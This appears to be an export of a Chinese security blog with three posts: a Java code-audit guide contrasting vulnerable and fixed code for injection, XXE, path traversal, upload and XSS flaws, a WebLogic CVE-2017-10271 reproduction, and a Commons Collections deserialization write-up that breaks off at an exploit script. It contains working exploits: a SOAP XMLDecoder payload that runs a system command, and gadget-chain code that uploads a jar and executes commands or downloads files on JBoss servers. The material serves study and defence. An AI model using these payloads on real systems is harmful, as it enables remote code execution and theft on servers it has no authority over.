if(!con.isClosed()) &#123; //要执行的SQL语句 String sql = &quot;select * from users where id=?&quot;; //创建statement类对象，ResultSet类，用来存放获取的结果集！！ PreparedStatement stmt = con.prepareStatement(sql); stmt.setString(1, id); ResultSet rs = stmt.executeQuery(); System.out.println(&quot;-----------------&quot;); System.out.println(&quot;执行Sql语句: &quot;+stmt.toString()); System.out.println(&quot;执行结果如下所示:&quot;); String uname,name; while (rs.next()) &#123; //获取stuname这列数据 uname = rs.getString(&quot;uname&quot;); //获取stuid这列数据 name = rs.getString(&quot;name&quot;); //输出结果 System.out.println(uname + &quot;\t&quot; + name); &#125; rs.close(); con.close(); &#125; &#125; catch(ClassNotFoundException e) &#123; //数据库驱动类异常处理 e.printStackTrace(); &#125; catch(SQLException e) &#123; //数据库连接失败异常处理 e.printStackTrace(); &#125;catch (Exception e) &#123; e.printStackTrace(); &#125; result.put(&quot;data&quot;,res); result.put(&quot;success&quot;,true); return DataUtil.toJson(result); &#125; &#125;&#125; 12345SQL Paramter:1-----------------执行Sql语句: select * from users where id=&apos;1&apos;执行结果如下所示:test Alice 至于为什么还有1个查询结果，那就是Mysql的字符特性的问题了，这里不作多的解释。12345SQL Paramter:&apos; or &apos;a&apos;=&apos;a-----------------执行Sql语句: select * from users where id=&apos;1\&apos; or \&apos;a\&apos;=\&apos;a&apos;执行结果如下所示:test Alice 防范建议 采用参数查询即预编译方式（首选） 字符串过滤 XXE原理合法输入123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;users&gt; &lt;user&gt; &lt;id&gt;1&lt;/id&gt; &lt;uname&gt;test&lt;/uname&gt; &lt;passwd&gt;e10adc3949ba59abbe56e057f20f883e&lt;/passwd&gt; &lt;name&gt;Alice&lt;/name&gt; &lt;/user&gt;&lt;/users&gt; 1&#123;&quot;id&quot;:&quot;1&quot;,&quot;uname&quot;:&quot;test&quot;,&quot;passwd&quot;:&quot;e10adc3949ba59abbe56e057f20f883e&quot;,&quot;name&quot;:&quot;Alice&quot;&#125; 恶意输入1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE xdsec [&lt;!ELEMENT methodname ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http://localhost/text.txt&quot; &gt;]&gt;&lt;methodcall&gt;&lt;methodname&gt;%26xxe;&lt;/methodname&gt;&lt;/methodcall&gt; 本地80端口WEB服务器收到如下请求： 12345127.0.0.1 - - [08/Jan/2018:17:03:27 +0800] &quot;GET /text.txt HTTP/1.1&quot; 404 1053 &quot;-&quot; &quot;Java/1.8.0_51&quot;127.0.0.1 - - [08/Jan/2018:17:03:28 +0800] &quot;GET /text.txt HTTP/1.1&quot; 404 1053 &quot;-&quot; &quot;Java/1.8.0_51&quot;127.0.0.1 - - [08/Jan/2018:17:03:28 +0800] &quot;GET /text.txt HTTP/1.1&quot; 404 1053 &quot;-&quot; &quot;Java/1.8.0_51&quot;127.0.0.1 - - [08/Jan/2018:17:03:28 +0800] &quot;GET /text.txt HTTP/1.1&quot; 404 1053 &quot;-&quot; &quot;Java/1.8.0_51&quot;127.0.0.1 - - [08/Jan/2018:17:03:28 +0800] &quot;GET /text.txt HTTP/1.1&quot; 404 1053 &quot;-&quot; &quot;Java/1.8.0_51&quot; Java代码分析不合规代码1234567891011121314151617181920212223242526272829public class XMlXXEFormat &#123; public static void main(String[] args)throws Exception&#123; String data = &quot;&quot;; XMlXXEInject(data); &#125; public String XMlXXEInject(String data)&#123; Map&lt;String,Object&gt; result = new HashMap&lt;&gt;(); List&lt;User&gt; res = new ArrayList(); result.put(&quot;success&quot;,false); if (data!=null&amp;&amp;!data.isEmpty())&#123; // 获取基于SAX的解析器的实例 try &#123; System.out.println(data); SAXParserFactory factory = SAXParserFactory.newInstance(); // 2.创建一个SAXParser实例 SAXParser saxParser = factory.newSAXParser(); // 3.解析 MySaxHandler myhandler = new MySaxHandler(); saxParser.parse(new ByteArrayInputStream(data.getBytes()), myhandler); res = myhandler.getUserList(); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; result.put(&quot;data&quot;, res); System.out.println(DataUtil.toJson(result)); &#125;&#125; 合规代码1234567891011121314151617181920212223242526272829303132public class XMlXXEFormat &#123; public static void main(String[] args)throws Exception&#123; String data = &quot;&quot;; XMlXXEInject(data); &#125; public String XMlXXEInject(String data)&#123; Map&lt;String,Object&gt; result = new HashMap&lt;&gt;(); List&lt;User&gt; res = new ArrayList(); result.put(&quot;success&quot;,false); if (data!=null&amp;&amp;!data.isEmpty())&#123; // 获取基于SAX的解析器的实例 try &#123; System.out.println(data); SAXParserFactory factory = SAXParserFactory.newInstance(); factory.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true); factory.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false); factory.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false); // 2.创建一个SAXParser实例 SAXParser saxParser = factory.newSAXParser(); // 3.解析 MySaxHandler myhandler = new MySaxHandler(); saxParser.parse(new ByteArrayInputStream(data.getBytes()), myhandler); res = myhandler.getUserList(); &#125; catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; result.put(&quot;data&quot;, res); System.out.println(DataUtil.toJson(result)); &#125;&#125; 报错如下：1org.xml.sax.SAXParseException; lineNumber: 1; columnNumber: 50; 将功能 &quot;http://apache.org/xml/features/disallow-doctype-decl&quot; 设置为“真”时, 不允许使用 DOCTYPE。 防范建议 使用开发语言提供的禁用外部实体的方法（首选） 过滤用户提交的XML数据，关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC。 命令注入原理合法输入128.8.8.8ping -n/-c 1 8.8.8.8 恶意输入128.8.8.8 &amp; whoamiping -n/-c 1 8.8.8.8 &amp; whoami Java代码分析不合规代码123456789101112131415161718192021222324252627282930313233343536373839public class ExecTestController &#123; public static void main(String[] args)throws Exception&#123; String data = &quot;8.8.8.8 &amp; ipconfig/all &quot;; ExecInject(data); &#125; public String ExecInject(HttpServletRequest request)&#123; String command = request.getParameter(&quot;command&quot;); Map&lt;String,Object&gt; result = new HashMap&lt;&gt;(); result.put(&quot;success&quot;,false); StringBuffer buffer = null; if (command!=null&amp;&amp;!command.isEmpty())&#123; // 1.获取基于SAX的解析器的实例 try &#123; System.out.println(&quot;Command: ping&quot;+ command); Runtime rt = Runtime.getRuntime(); Process proc = rt.exec(&quot;cmd.exe /C ping &quot;+command); // Process proc = rt.exec(new String [] &#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls &quot;+order&#125;); int res = proc.waitFor(); if(res !=0)&#123; System.out.println(&quot;process error: &quot;+ res); &#125; InputStream in = (res == 0)? proc.getInputStream() : proc.getErrorStream(); BufferedReader reader=new BufferedReader(new InputStreamReader(in)); buffer=new StringBuffer(); String line; while((line = reader.readLine())!=null)&#123; buffer.append(line+&quot;\n&quot;); &#125; &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; System.out.print(buffer.toString()); &#125;&#125; 合规代码1234567891011121314151617181920212223242526272829303132333435363738394041424344public class ExecTestController &#123; public static void main(String[] args)throws Exception&#123; String data = &quot;8.8.8.8 &amp; ipconfig/all &quot;; ExecFormat(data); &#125; public String ExecFormat(HttpServletRequest request)&#123; String command = request.getParameter(&quot;command&quot;); Map&lt;String,Object&gt; result = new HashMap&lt;&gt;(); result.put(&quot;success&quot;,false); StringBuffer buffer = null; if (command!=null&amp;&amp;!command.isEmpty())&#123; // 1.获取基于SAX的解析器的实例 try &#123; // 严格校验参数 if (!Pattern.matches(&quot;[A-Za-z@.]+&quot;, command))&#123; ; result.put(&quot;message&quot;, &quot;Error!&quot;); return DataUtil.toJson(result); &#125; System.out.println(&quot;Command: ping&quot;+ command); Runtime rt = Runtime.getRuntime(); Process proc = rt.exec(&quot;cmd.exe /C ping &quot;+command); // Process proc = rt.exec(new String [] &#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls &quot;+order&#125;); int res = proc.waitFor(); if(res !=0)&#123; System.out.println(&quot;process error: &quot;+ res); &#125; InputStream in = (res == 0)? proc.getInputStream() : proc.getErrorStream(); BufferedReader reader=new BufferedReader(new InputStreamReader(in)); buffer=new StringBuffer(); String line; while((line = reader.readLine())!=null)&#123; buffer.append(line+&quot;\n&quot;); &#125; &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; System.out.print(buffer.toString()); &#125;&#125; 防范建议 白名单 严格权限限制等等 严格校验参数 任意文件下载/目录遍历原理在JAVA web程序的下载文件相关的代码中，若不对HTTP请求中的待下载文件名进行检查，则有可能产生任意文件下载漏洞。目录遍历与任意文件下载的原理相似，这里就简单列个文件下载好了 合法输入12path=users.docsconfig/users.docs 恶意输入12path=../../../../Windows/System32/drivers/etc/HOSTSconfig/../../../../Windows/System32/drivers/etc/HOSTS Java代码分析不合规代码12345678910111213141516171819202122232425262728293031323334353637383940414243public class FileTestController &#123; public void FileFileDownVul(HttpServletRequest request,HttpServletResponse response)&#123; String path = request.getParameter(&quot;path&quot;); Map&lt;String,Object&gt; result = new HashMap&lt;&gt;(); result.put(&quot;success&quot;,false); if (path!=null&amp;&amp;!path.isEmpty())&#123; // 1.获取基于SAX的解析器的实例 try &#123; path = &quot;config/&quot;+path; File file = new File(path); System.out.println(path); response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment;filename=\&quot;&quot; + new String(path.getBytes(), &quot;ISO8859-1&quot;) + &quot;\&quot;&quot;); response.setContentLength((int) file.length()); byte[] buffer = new byte[4096];// 缓冲区 BufferedOutputStream output = null; BufferedInputStream input = null; try &#123; output = new BufferedOutputStream(response.getOutputStream()); input = new BufferedInputStream(new FileInputStream(file)); int n = -1; //遍历，开始下载 while ((n = input.read(buffer, 0, 4096)) &gt; -1) &#123; output.write(buffer, 0, n); &#125; output.flush(); //不可少 response.flushBuffer();//不可少 &#125; catch (Exception e) &#123; //异常自己捕捉 &#125; finally &#123; //关闭流，不可少 if (input != null) input.close(); if (output != null) output.close(); &#125; &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; &#125;&#125; 合规代码1234567891011121314151617181920212223242526272829303132333435363738394041424344public class FileTestController &#123; public void FileFileDownFormat(HttpServletRequest request,HttpServletResponse response)&#123; String path = request.getParameter(&quot;path&quot;); Map&lt;String,Object&gt; result = new HashMap&lt;&gt;(); result.put(&quot;success&quot;,false); if (path!=null&amp;&amp;!path.isEmpty())&#123; try &#123; if (!Pattern.matches(&quot;^([a-z0-9]&#123;32&#125;)$&quot;, path))&#123; ; return ; &#125; path = &quot;config/&quot;+path+&quot;.docx&quot;; File file = new File(path); System.out.println(path); response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment;filename=\&quot;&quot; + new String(path.getBytes(), &quot;ISO8859-1&quot;) + &quot;\&quot;&quot;); response.setContentLength((int) file.length()); byte[] buffer = new byte[4096];// 缓冲区 BufferedOutputStream output = null; BufferedInputStream input = null; try &#123; output = new BufferedOutputStream(response.getOutputStream()); input = new BufferedInputStream(new FileInputStream(file)); int n = -1; //遍历，开始下载 while ((n = input.read(buffer, 0, 4096)) &gt; -1) &#123; output.write(buffer, 0, n); &#125; output.flush(); //不可少 response.flushBuffer();//不可少 &#125; catch (Exception e) &#123; //异常自己捕捉 &#125; finally &#123; //关闭流，不可少 if (input != null) input.close(); if (output != null) output.close(); &#125; &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; &#125;&#125; 防范建议 严格的权限限制。 控制路径后缀，对文件名进行检查等。 采用getCanonicalPath、getAbsolutePath等方法。 任意文件上传原理当攻击者利用恶意文件上传漏洞时，通常会向服务器上传jsp木马并访问，可以直接控制服务器。 合法输入1234567891011-----------------------------11922861918696Content-Disposition: form-data; name=&quot;name&quot;test.txt-----------------------------11922861918696Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.txt&quot;Content-Type: text/plaintest-----------------------------11922861918696-- 恶意输入12345678910111213-----------------------------11922861918696Content-Disposition: form-data; name=&quot;name&quot;../test.jsp-----------------------------11922861918696Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.txt&quot;Content-Type: text/plain...webshell....-----------------------------11922861918696-- Java代码分析不合规代码123456789101112131415161718192021222324252627public class FileTestController &#123; @RequestMapping(&quot;/Index&quot;) public String FileFileUpload(Map&lt;String,Object&gt; map)&#123; return &quot;Fileup&quot;; &#125; @ResponseBody @RequestMapping(value= &quot;/File/FileUpVul&quot;,method= RequestMethod.POST) public String FileFileUpVul(HttpServletRequest request,@RequestParam(&quot;file&quot;) MultipartFile file)&#123; String name = request.getParameter(&quot;name&quot;); if (!file.isEmpty()) &#123; try &#123; byte[] bytes = file.getBytes(); BufferedOutputStream stream = new BufferedOutputStream(new FileOutputStream(new File(&quot;config/&quot;+name))); stream.write(bytes); stream.close(); return &quot;You successfully uploaded &quot; + name + &quot; into config/&quot; + name; &#125; catch (Exception e) &#123; return &quot;You failed to upload &quot; + name + &quot; =&gt; &quot; + e.getMessage(); &#125; &#125; else &#123; return &quot;You failed to upload &quot; + name + &quot; because the file was empty.&quot;; &#125; &#125;&#125; 合规代码1234567891011121314151617181920212223242526272829public class FileTestController &#123; @RequestMapping(&quot;/Index&quot;) public String FileFileUpload(Map&lt;String,Object&gt; map)&#123; return &quot;Fileup&quot;; &#125; @ResponseBody @RequestMapping(value= &quot;/File/FileUpVul&quot;,method= RequestMethod.POST) public String FileFileUpVul(HttpServletRequest request,@RequestParam(&quot;file&quot;) MultipartFile file)&#123; String name = DataUtil.getTimeStamp()+&quot;.jpg&quot;; if (!file.isEmpty()) &#123; try &#123; // 判断大小等等,只要做好配置，并不需要检查文件头。 if(file.getSize()&lt;1024*1024*10)&#123; byte[] bytes = file.getBytes(); BufferedOutputStream stream = new BufferedOutputStream(new FileOutputStream(new File(&quot;config/&quot;+name))); stream.write(bytes); stream.close(); return &quot;You successfully uploaded &quot; + name + &quot; into config/&quot; + name; &#125; &#125; catch (Exception e) &#123; return &quot;You failed to upload &quot; + name + &quot; =&gt; &quot; + e.getMessage(); &#125; &#125; return &quot;You failed to upload &quot; + name + &quot; because the file was empty.&quot;;&#125; 防范建议 控制文件名 控制文件内容 控制上传目录的权限 XSS原理这里仅仅拿了个反射的XSS做例子。 合法输入12alicehello,alice. 恶意输入121&lt;script&gt;alert(1)&lt;/script&gt;hello,1&lt;script&gt;alert(1)&lt;/script&gt;. Java代码分析不合规代码123456789101112public class XSSTestController &#123; public String XXSXXSInject(HttpServletRequest request)&#123; String data = request.getParameter(&quot;data&quot;); if (data!=null&amp;&amp;!data.isEmpty())&#123; return &quot;hello,&quot;+data+&quot;.&quot;; &#125; return &quot;404&quot;; &#125;&#125; 合规代码123456789public class XSSTestController &#123; public String XXSXXSInject(HttpServletRequest request)&#123; String data = request.getParameter(&quot;data&quot;); if (data!=null&amp;&amp;!data.isEmpty())&#123; return &quot;hello,&quot;+HtmlUtils.htmlEscape(data)+&quot;.&quot;; &#125; return &quot;404&quot;; &#125;&#125; 121&lt;script&gt;alert(1)&lt;/script&gt;hello,1&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;. 防范建议 对用户的输入进行html编码。 其他场景这些场景和前面提到的类似或者比较浅显易懂，就不贴代码了。 压缩文件问题没有检测压缩后的大小等细节。 其他未净化输入导致日志等处被污染顾名思义，应用程序的日志被污染，如果输出到页面上也容易触发XSS。 合法输入123orleven正常用户登录失败，记录日志.....User Login Successed for: orleven 恶意输入1234orleven\r\nUser Login Successed for: administrator恶意用户登录失败，记录日志.....User Login Failed for: orlevenUser Login Successed for: administrator 正则表达式的拼接原理与SQL注入基本相同。 合法输入12search=error(.*? +public\\[\\d+\\]+.*error.*) 恶意输入12search=.*)|(.*(.*? +public\\[\\d+\\]+.*.*)|(.*.*) XML注入的拼接原理与SQL注入基本相同。 合法输入123456quantity=1&lt;item&gt; &lt;name&gt;apple&lt;/name&gt; &lt;price&gt;500.0&lt;/price&gt; &lt;quantity&gt;1&lt;/quantity&gt;&lt;item&gt; 恶意输入123456quantity=1&lt;/quantity&gt;&lt;price&gt;5.0&lt;/price&gt;&lt;quantity&gt;1&lt;item&gt; &lt;name&gt;apple&lt;/name&gt; &lt;price&gt;500.0&lt;/price&gt; &lt;quantity&gt;1&lt;/quantity&gt;&lt;price&gt;5.0&lt;/price&gt;&lt;quantity&gt;1&lt;/quantity&gt;&lt;item&gt; 总结想要学好代码审计，就必须多接触主流的的框架，例如Spring等，在了解各各类框架之后，才能更快的上手。 相关测试代码参考文章]]></content>
      <categories>
        <category>code audit</category>
      </categories>
      <tags>
        <tag>code audit</tag>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Weblogic CVE-2017-10271]]></title>
    <url>%2F2017%2F12%2F23%2Fweblogic-cve-2017-10271%2F</url>
    <content type="text"><![CDATA[概述2017年10月17日Oracle推送更新补丁，修复其所发现的安全漏洞，其中CVE-2017-10271可能会导致攻击者获得Weblogic服务器权限，请尽快修复。 详情漏洞位置Oracle Weblogic Server WLS 安全组件 影响版本Oracle Weblogic Server 10.3.6.0Oracle Weblogic Server 12.2.1.2Oracle Weblogic Server 12.2.1.1Oracle Weblogic Server 12.1.3.0 漏洞复现修改Content-Type: text/xml，并向/wls-wsat/CoordinatorPortType发送POST数据包。123456789101112131415161718192021&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;&lt;soapenv:Header&gt;&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;&lt;java version=&quot;1.7.0_79&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;&lt;array class=&quot;java.lang.String&quot; length=&quot;2&quot;&gt;&lt;void index=&quot;0&quot;&gt;&lt;string&gt;/usr/bin/touch&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;1&quot;&gt;&lt;string&gt;test1234567&lt;/string&gt;&lt;/void&gt;&lt;/array&gt;&lt;void method=&quot;start&quot; /&gt;&lt;/void&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt; 具体复现如下： 总结发现POC早就是好几年前的了，主要是XMLDecoder组件没修，附：检测脚本。]]></content>
      <categories>
        <category>code execution</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>code execution</tag>
        <tag>weblogic</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Commons Collections Java 反序列化漏洞总结]]></title>
    <url>%2F2017%2F11%2F11%2Fjava-deserialize%2F</url>
    <content type="text"><![CDATA[概述Java 反序列化漏洞，‍‍序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中；反序列化即逆过程，由字节流还原成对象。 序列化与反序列化12345String obj ="hello, world! This is a test!";FileOutputStream fos = new FileOutputStream("test/object");ObjectOutputStream os = new ObjectOutputStream(fos);os.writeObject(obj);os.close(); 12345FileInputStream fis = new FileInputStream("test/object");ObjectInputStream ois = new ObjectInputStream(fis);String obj2 = (String) ois.readObject(); System.out.print(obj2);ois.close(); 最后输出为hello, world! This is a test!。 Commons Collections JavaApache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。当然Java反序列化的问题就是出在org.apache.commons.collections这个库，这个库里的Package如下图所示： 123456789101112org.apache.commons.collectionsorg.apache.commons.collections.bagorg.apache.commons.collections.bidimaporg.apache.commons.collections.bufferorg.apache.commons.collections.collectionorg.apache.commons.collections.comparatorsorg.apache.commons.collections.functorsorg.apache.commons.collections.iteratorsorg.apache.commons.collections.keyvalueorg.apache.commons.collections.listorg.apache.commons.collections.maporg.apache.commons.collections.set 里面主要涉及到的类有ConstantTransformer、InvokerTransformer等 整个poc的逻辑可以这么理解，构建了BeforeTransformerMap的键值对，为其赋值，利用TransformedMap的decorate方法，可以对Map数据结构的key，value进行transforme。 TransformedMap.decorate方法,预期是对Map类的数据结构进行转化，该方法有三个参数。第一个参数为待转化的Map对象，第二个参数为Map对象内的key要经过的转化方法（可为单个方法，也可为链，也可为空），第三个参数为Map对象内的value要经过的转化方法。 TransformedMap.decorate(目标Map, key的转化对象（单个或者链或者null）, value的转化对象（单个或者链或者null）); poc中对BeforeTransformerMap的value进行转换，当BeforeTransformerMap的value执行完一个完整转换链，就完成了命令执行。 在进行反序列化时，我们会调用ObjectInputStream类的readObject()方法。如果被反序列化的类重写了readObject()，那么该类在进行反序列化时，Java会优先调用重写的readObject()方法。 结合前述Commons Collections的特性，如果某个可序列化的类重写了readObject()方法，并且在readObject()中对Map类型的变量进行了键值修改操作，并且这个Map变量是可控的，就可以实现我们的攻击目标了。 因此我们在poc中看见了下行的代码。 123456789101112131415161718192021222324252627282930 Transformer transforms[] = &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;"getRuntime", new Class[0]&#125; ), new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class&#125;, new Object[] &#123;0, new Object[0]&#125; ), new InvokerTransformer("exec", new Class[] &#123;String[].class&#125;, new Object[] &#123;commands&#125; )&#125;;Transformer transformerChain = new ChainedTransformer(transforms);Map tempMap = new HashMap();tempMap.put("value", "tentacle");Map exMap = TransformedMap.decorate(tempMap, null, transformerChain);Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");Constructor ctor = cls.getDeclaredConstructor(new Class[] &#123;Class.class, Map.class&#125;);ctor.setAccessible(true);instance = ctor.newInstance(new Object[] &#123;Target.class, exMap&#125;);ByteArrayOutputStream bo = new ByteArrayOutputStream(10);ObjectOutputStream out = new ObjectOutputStream(bo);out.writeObject(instance);out.flush();out.close();return bo.toByteArray(); 如果要实现一个可控的poc，需要对transformer链的构造进行理解。首先来看InvokerTransformer。 123456789101112131415 Transformer transforms[] = &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;"getRuntime", new Class[0]&#125; ), new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class&#125;, new Object[] &#123;0, new Object[0]&#125; ), new InvokerTransformer("exec", new Class[] &#123;String[].class&#125;, new Object[] &#123;commands&#125; )&#125;; 这样，这段恶意代码本质上就是利用反射调用Runtime() 执行了一段系统命令，作用等同于： 1((Runtime)Runtime.class.getMethod("getMethod",null).invoke(null,null)).exec(commands); 其对应关系如下： 123456789101112131415161718192021222324// ChainedTransformer类对象，传入transformers数组，可以按照transformers数组的逻辑执行转化操作Transformer transformerChain = new ChainedTransformer(transforms);// Map数据结构，转换前的Map，Map数据结构内的对象是键值对形式Map tempMap = new HashMap();tempMap.put("value", "orleven");// 对Map类的数据结构进行转化// TransformedMap.decorate(目标Map, key的转化对象(单个或者链或者null), value的转化对象(单个或者链或者null));Map exMap = TransformedMap.decorate(tempMap, null, transformerChain); //实例化一个AnnotationInvocationHandler类，将其成员变量memberValues赋值为精心构造的恶意TransformedMap对象。Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");Constructor ctor = cls.getDeclaredConstructor(new Class[] &#123;Class.class, Map.class&#125;);ctor.setAccessible(true);instance = ctor.newInstance(new Object[] &#123;Target.class, exMap&#125;);// 序列化后转化为byte数组，提交给未做安全检测的Java应用。Java应用在进行反序列化操作时，则会触发TransformedMap的变换函数，执行预设的命令。ByteArrayOutputStream bo = new ByteArrayOutputStream(10);ObjectOutputStream out = new ObjectOutputStream(bo);out.writeObject(instance);out.flush();out.close();return bo.toByteArray(); JBossJBoss JMXInvokerServlet 反序列化JBoss JMXInvokerServlet 存在反序列化漏洞。invoker/JMXInvokerServlet 可直接向http://192.168.111.145:8080/invoker/JMXInvokerServlet发送特殊构造的恶意代码，但是由于这个漏洞本身不回显，漏洞一开始并不好利用。后来大佬们通常先上传一个jar文件，然后通过加载Jar的方式进行异常封装，从而解决了回显的问题,具体poc如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103public static Object fileupload(String filepath, byte[] data) &#123; Object instance = null; try &#123;// ((FileOutputStream)FileOutputStream.class.getDeclaredConstructor(null).newInstance(null)).write(data); Transformer transforms[] = &#123; new ConstantTransformer(FileOutputStream.class), new InvokerTransformer("getDeclaredConstructor", new Class[] &#123;Class[].class&#125;, new Object[] &#123;new Class[] &#123;String.class&#125;&#125; ), new InvokerTransformer("newInstance", new Class[] &#123;Object[].class&#125;, new Object[] &#123;new Object[] &#123;filepath&#125;&#125; ), new InvokerTransformer("write", new Class[] &#123;byte[].class&#125;, new Object[] &#123;data&#125; ) &#125;; Transformer transformerChain = new ChainedTransformer(transforms); Map tempMap = new HashMap(); tempMap.put("value", "orleven"); Map exMap = TransformedMap.decorate(tempMap, null, transformerChain); Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler"); Constructor ctor = cls.getDeclaredConstructor(new Class[] &#123;Class.class, Map.class&#125;); ctor.setAccessible(true); instance = ctor.newInstance(new Object[]&#123;Target.class, exMap&#125;); &#125;catch (Exception e)&#123; e.printStackTrace(); return null; &#125; return instance; &#125;public static Object classInject(String packUri, String className, String[] code) &#123; Object instance = null; try &#123; // ((URLClassLoader)URLClassLoader.class.getMethod("newInstance",null).invoke(null,packUri)).loadClass(className).getMethod("main",null).invoke(null,code) Transformer transforms[] = &#123; new ConstantTransformer(URLClassLoader.class), new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;"newInstance", new Class[] &#123;URL[].class&#125;&#125; ), new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class&#125;, new Object[] &#123;0, new Object[] &#123;new URL[] &#123;new URL(packUri)&#125;&#125;&#125; ), new InvokerTransformer("loadClass", new Class[] &#123;String.class&#125;, new Object[] &#123;className&#125;), new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;"main", new Class[] &#123;String[].class&#125;&#125; ), new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class&#125;, new Object[] &#123;0, new Object[] &#123;code&#125;&#125; ) &#125;; Transformer transformerChain = new ChainedTransformer(transforms); Map tempMap = new HashMap(); tempMap.put("value", "orleven"); Map exMap = TransformedMap.decorate(tempMap, null, transformerChain); Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler"); Constructor ctor = cls.getDeclaredConstructor(new Class[] &#123;Class.class, Map.class&#125;); ctor.setAccessible(true); instance = ctor.newInstance(new Object[]&#123;Target.class, exMap&#125;); &#125;catch (Exception e)&#123; e.printStackTrace(); return null; &#125; return instance; &#125; public static byte[] getPayload(Object instance)&#123; try&#123; ByteArrayOutputStream bo = new ByteArrayOutputStream(10); ObjectOutputStream out = new ObjectOutputStream(bo); out.writeObject(instance); out.flush(); out.close(); return bo.toByteArray(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return null; &#125; // 上传jar getPayload(fileupload("util.jar",filedata)); // 执行命令 getPayload(classInject("file:util.jar","jc.util.CommUtil",new String[]&#123;"data","-action","runcmd","uname -a"&#125;)); // 下载文件 getPayload(classInject("file:util.jar","jc.util.CommUtil",new String[]&#123;"data","-action","file-download",filename&#125;)); JBoss CVE-2017-12149JBoss /invoker/readonly 存在反序列化漏洞，即没有对数据进行任何的安全处理便进行了反序列化处理，造成了漏洞的形成。 访问服务器的/invoker/readonly页面，服务器返回500错误 这个漏洞的POC和前一个JBoss反序列化漏洞基本相同，所以这里就不贴代码了。 发送payload后服务端的日志如下： Weblogic因为weblogic会把异常直接打印到服务器端的控制台上，所以在jboss中通过异常封装回显的方法在weblogic上并不适用。但是weblogic有更方便的方法，weblogic是通过T3协议来传输序列化的类，那我们就可以通过T3协议来实现exploit和server的通信，因为weblogic的T3协议和WEB协议共用同一个端口，所以只要能访问weblogic，就可以利用，不需要加载远程类，因此对服务器能否连外网没有要求。 T3 协议这里主要介绍下T3协议，不想看的可以跳过这里。T3 也称为丰富套接字，是BEA内部协议，功能丰富，可扩展性好。T3是多工双向和异步协议，经过高度优化，只使用一个套接字和一条线程。WebLogic Server 中的 RMI（远程方法调用） 通信使用 T3 协议在 WebLogic Server 和其他 Java 程序（包括客户端及其他 WebLogic Server 实例）间传输数据。服务器实例将跟踪所连接的每个 Java 虚拟机（Java Virtual Machine，简称 JVM），并创建单个 T3 连接以承担 JVM 的所有流量。请参阅“管理控制台联机帮助”中的配置 T3 协议。 使用T3协议向服务器发送数据：1t3 7.0.0.0\nAS:10\nHL:19\n\n 第一行为t3加weblogic客户端的版本号。 weblogic服务器的返回数据为:1HELO:10.0.2.0.false\nAS:2048\nHL:19\n\n 第一行为HELO:加weblogic服务器的版本号。weblogic客户端与服务器发送的数据均以\n\n结尾。 经测试，使用1t3 9.2.0\nAS:255\nHL:19\n\n 字符串作为T3的协议头发送给weblogic9、weblogic10g、weblogic11g、weblogic12c均合法。 在收到服务器的返回数据包后，就可了发送poc了。 poc的结构为：发送的数据长度 + weblogic的固定数据 + 反序列化的恶意代码 + 其他数据，具体如下： 即可触发漏洞。 CVE-2015-4852这个版本没有任何的过滤，可直接利用。 CVE-2016-0638、CVE-2016-3510、CVE-2017-3248因为weblogic的补丁是采用黑名单的过滤方式进行修补，容易有绕过的方式，下面就是大佬们的相关脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960# -*- coding: utf-8 -*-import socketimport timeimport re## @author iswin@threathunter.org# reffer: 